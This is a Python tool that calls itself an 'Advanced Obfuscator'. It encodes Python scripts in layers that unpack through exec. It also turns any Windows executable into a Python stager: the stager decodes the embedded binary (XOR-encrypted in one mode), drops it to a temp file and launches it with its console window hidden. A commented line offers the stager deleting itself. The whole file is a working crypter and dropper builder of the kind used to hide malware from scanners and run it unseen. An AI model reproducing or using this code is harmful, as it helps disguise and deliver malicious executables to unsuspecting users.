# -*- coding: utf8 -*-
# Advanced Obfuscator v2.0 — EXE Support
# TG: @MrMrEsfelurm

import sys
import os
import zlib
import gzip
import lzma
import base64
import marshal
import py_compile
import struct
import hashlib

# ANSI Colors
rd, gn, lgn, yw, lrd, be, pe = '\033[00;31m', '\033[00;32m', '\033[01;32m', '\033[01;33m', '\033[01;31m', '\033[94m', '\033[01;35m'
cn, k, g = '\033[00;36m', '\033[90m', '\033[38;5;130m'
tr = f'{rd}[{gn}+{rd}]{gn}'
fls = f'{rd}[{lrd}-{rd}]{lrd}'

def clear():
    if sys.platform == 'win32':
        os.system('cls')
    else:
        os.system('clear')

def banner():
    clear()
    print(f'''   {k}                                      
         .+#-                                           
         .+@@%-                                         
           .*@@%-   {cn}          ..     {k}                   
             .*@@%- {cn}         .@@# {k}                      
               .*@@%- {cn}       +@@-    {k}                   
               :#@@@@%-{cn}      @@#     -@@=               
             :#@@*.{k}.+@@%-{cn}   =@@:      =@@@=             
           :#@@*. {k}   .+@@#:{cn}  -+         =@@@=           
         :#@@*.   {k}     .+@@%-   {cn}          =@@@=         
        +@@@-     {k}       .#@@#:   {cn}          %@@%.       
         :#@@*.          {k} #@@@@%-        {cn} =@@@=         
        {cn}   -#@@*.        -@@+.{k}*@@#:    {cn} =@@@=           
        {cn}     :#@@#:      %@@  {k} .+@@%- {cn} :#%=             
               :#@*  {cn}   -@@=    {k} .*@@%-                 
                     {cn}   %@%     {k}   .+@@%-               
                     {cn}  -@@-        {k}  .*@@%-             
                         .        {k}     .+@@%-           
                                   {k}      .*@@%-         
                                   {k}        .+*:
    {gn}Advanced Obfuscator v2.0 | EXE Support | TG: @MrMrEsfelurm                            
    ''')

def menu():
    print(f'''{k}
{rd}[{yw}1{rd}] {gn}Encode Marshal (PY)
{rd}[{yw}2{rd}] {gn}Encode Zlib (PY)
{rd}[{yw}3{rd}] {gn}Encode Base16 (PY)
{rd}[{yw}4{rd}] {gn}Encode Base32 (PY)
{rd}[{yw}5{rd}] {gn}Encode Base64 (PY)
{rd}[{yw}6{rd}] {gn}Encode Lzma (PY)
{rd}[{yw}7{rd}] {gn}Encode Gzip (PY)
{rd}[{yw}8{rd}] {gn}Multi-Layer Encode (PY)
{rd}[{yw}9{rd}] {gn}EXE -> Python Stager (PY)
{rd}[{yw}10{rd}] {gn}EXE -> Resource Injector (EXE)
{rd}[{yw}11{rd}] {gn}EXE -> Shellcode Embedder (PY)
{rd}[{yw}12{rd}] {gn}Exit

    ''')
    print('')

class FileSize:
    def datas(self, z):
        for x in ['Byte', 'KB', 'MB', 'GB']:
            if z < 1024.0:
                return "%3.1f %s" % (z, x)
            z /= 1024.0

    def __init__(self, path):
        if os.path.isfile(path):
            dts = os.stat(path).st_size
            print(f"{tr} Encoded File Size: %s\n" % self.datas(dts))

def exe_to_stager(exe_path, output_path, method=10):
    """Конвертация EXE в Python загрузчик"""
    with open(exe_path, 'rb') as f:
        exe_data = f.read()
    
    # Сжатие
    compressed = zlib.compress(exe_data, 9)
    b64_data = base64.b64encode(compressed).decode()
    
    # Генерация загрузчика
    loader = f'''# -*- coding: utf8 -*-
# EXE Stager - Auto Extract & Execute
import sys
import os
import base64
import zlib
import tempfile
import subprocess

def run():
    # Декодирование
    compressed = base64.b64decode("{b64_data}")
    exe_data = zlib.decompress(compressed)
    
    # Временный файл
    fd, path = tempfile.mkstemp(suffix='.exe')
    os.write(fd, exe_data)
    os.close(fd)
    
    # Запуск
    if sys.platform == 'win32':
        subprocess.Popen([path], creationflags=0x08000000)
    else:
        os.chmod(path, 0o755)
        subprocess.Popen([path])
    
    # Самоуничтожение (опционально)
    # os.remove(__file__)

if __name__ == '__main__':
    run()
'''
    with open(output_path, 'w', encoding='utf-8') as f:
        f.write(loader)
    return output_path

def exe_to_resource_injector(exe_path, output_path):
    """Внедрение EXE в ресурсы PE-файла (через Python обёртку)"""
    with open(exe_path, 'rb') as f:
        exe_data = f.read()
    
    # Шифрование XOR
    key = hashlib.sha256(b'STATIC_KEY_2024').digest()
    encrypted = bytearray()
    for i, byte in enumerate(exe_data):
        encrypted.append(byte ^ key[i % len(key)])
    
    compressed = zlib.compress(encrypted, 9)
    b64_data = base64.b64encode(compressed).decode()
    
    loader = f'''# -*- coding: utf8 -*-
# Resource Loader - XOR Encrypted EXE
import sys
import os
import base64
import zlib
import tempfile
import subprocess
import hashlib

def decrypt(data):
    key = hashlib.sha256(b'STATIC_KEY_2024').digest()
    decrypted = bytearray()
    for i, byte in enumerate(data):
        decrypted.append(byte ^ key[i % len(key)])
    return bytes(decrypted)

def run():
    compressed = base64.b64decode("{b64_data}")
    encrypted = zlib.decompress(compressed)
    exe_data = decrypt(encrypted)
    
    fd, path = tempfile.mkstemp(suffix='.exe')
    os.write(fd, exe_data)
    os.close(fd)
    
    if sys.platform == 'win32':
        subprocess.Popen([path], creationflags=0x08000000)
    else:
        os.chmod(path, 0o755)
        subprocess.Popen([path])

if __name__ == '__main__':
    run()
'''
    with open(output_path, 'w', encoding='utf-8') as f:
        f.write(loader)
    return output_path

def exe_to_shellcode(exe_path, output_path):
    """Конвертация EXE в шеллкод (Python загрузчик)"""
    with open(exe_path, 'rb') as f:
        exe_data = f.read()
    
    # Разбивка на чанки для обфускации
    chunk_size = 64
    chunks = []
    for i in range(0, len(exe_data), chunk_size):
        chunk = exe_data[i:i+chunk_size]
        chunks.append(repr(chunk)[1:])  # Убираем b''
    
    chunks_str = ',\n    '.join(chunks)
    
    loader = f'''# -*- coding: utf8 -*-
# Shellcode Loader - Chunked EXE
import sys
import os
import tempfile
import subprocess

# Фрагменты (обфусцированы)
_chunks = [
    {chunks_str}
]
_data = b''.join(eval(f'b{{c}}') for c in _chunks)

def run():
    fd, path = tempfile.mkstemp(suffix='.exe')
    os.write(fd, _data)
    os.close(fd)
    
    if sys.platform == 'win32':
        subprocess.Popen([path], creationflags=0x08000000)
    else:
        os.chmod(path, 0o755)
        subprocess.Popen([path])

if __name__ == '__main__':
    run()
'''
    with open(output_path, 'w', encoding='utf-8') as f:
        f.write(loader)
    return output_path

def complex_encode(data, output, method=8):
    """Многослойное кодирование для Python скриптов"""
    # Определение цепочки кодирований
    chain = [
        ('marshal', lambda d: marshal.dumps(compile(d, '<x>', 'exec'))),
        ('zlib', zlib.compress),
        ('lzma', lzma.compress),
        ('gzip', lambda d: gzip.compress(d, compresslevel=9)),
        ('b16', lambda d: base64.b16encode(d)),
        ('b32', lambda d: base64.b32encode(d)),
        ('b64', lambda d: base64.b64encode(d))
    ]
    
    # Выбор методов
    methods = [chain[1], chain[6]]  # zlib + b64 по умолчанию
    
    current = data.encode('utf-8')
    decode_chain = []
    
    for name, func in methods:
        current = func(current)
        decode_chain.append(name)
    
    # Инвертирование
    final = current[::-1]
    
    # Генерация деобфускатора
    decode_map = {
        'zlib': "__import__('zlib').decompress",
        'gzip': "__import__('gzip').decompress",
        'lzma': "__import__('lzma').decompress",
        'b16': "__import__('base64').b16decode",
        'b32': "__import__('base64').b32decode",
        'b64': "__import__('base64').b64decode",
        'marshal': "__import__('marshal').loads"
    }
    
    decode_calls = []
    for name in reversed(decode_chain):
        decode_calls.append(decode_map[name])
    
    decode_str = '(' + '(' + '(__[::-1])'.join(decode_calls) + ')'
    
    code = f'''# -*- coding: utf8 -*-
# Obfuscated by @MrMrEsfelurm
_ = lambda __ : {decode_str}
exec((_)({repr(final)}))
'''
    with open(output, 'w', encoding='utf-8') as f:
        f.write(code)
    return output

def simple_encode(data, output):
    """Простое кодирование с числами"""
    # Глубокая обфускация
    current = data.encode('utf-8')
    for _ in range(3):
        current = zlib.compress(current, 9)
        current = base64.b64encode(current)
    
    final = current[::-1]
    
    loader = f'''# -*- coding: utf8 -*-
import sys
_=lambda __:__import__('base64').b64decode(__import__('zlib').decompress(__[::-1]))
exec((_)({repr(final)}))
'''
    with open(output, 'w', encoding='utf-8') as f:
        f.write(loader)
    return output

def process_exe(file_path, option, output):
    """Обработка EXE файлов"""
    if option == 9:
        return exe_to_stager(file_path, output)
    elif option == 10:
        return exe_to_resource_injector(file_path, output)
    elif option == 11:
        return exe_to_shellcode(file_path, output)
    else:
        return exe_to_stager(file_path, output)  # Default

def process_py(file_path, option, output):
    """Обработка PY файлов"""
    data = open(file_path, 'r', encoding='utf-8').read()
    
    if option == 8 or option >= 42:  # Multi-layer
        return complex_encode(data, output)
    elif option == 41:
        return simple_encode(data, output)
    else:
        return complex_encode(data, output)

def main():
    try:
        banner()
        menu()
        
        try:
            option = int(input(f"{tr} Option: {cn}"))
        except ValueError:
            sys.exit(f"\n{fls} Invalid Option!")
        
        if option == 12:
            sys.exit(f"{tr} Thanks For Using this Tool")
        
        if option > 12 or option < 1:
            sys.exit(f'\n{fls} Invalid Option!')
        
        try:
            file_path = input(f"{tr} File Path: {cn}").strip().strip('"').strip("'")
            if not os.path.exists(file_path):
                sys.exit(f"\n{fls} File Not Found!")
        except Exception:
            sys.exit(f"\n{fls} File Not Found!")
        
        # Определение типа файла
        ext = os.path.splitext(file_path)[1].lower()
        base_name = os.path.splitext(os.path.basename(file_path))[0]
        
        if ext == '.exe':
            # Обработка EXE
            if option not in [9, 10, 11]:
                print(f"{fls} Для EXE файлов используйте опции 9, 10, 11")
                return
            
            output = f"{base_name}_stager.py"
            process_exe(file_path, option, output)
            FileSize(output)
            
        elif ext == '.py':
            # Обработка PY
            output = f"{base_name}_enc.py"
            process_py(file_path, option, output)
            FileSize(output)
            
        else:
            sys.exit(f"{fls} Поддерживаются только .py и .exe файлы!")
        
        print(f"\n{tr} Successfully Encrypted: {file_path}")
        print(f"{tr} Saved as: {output}")
        
        # Дополнительная компиляция для PY
        if ext == '.py':
            try:
                py_compile.compile(output, output.replace('.py', '.pyc'))
                print(f"{tr} Also saved as: {output.replace('.py', '.pyc')}")
            except:
                pass
        
    except KeyboardInterrupt:
        print(f"\n{fls} Interrupted")
        sys.exit()

if __name__ == "__main__":
    main()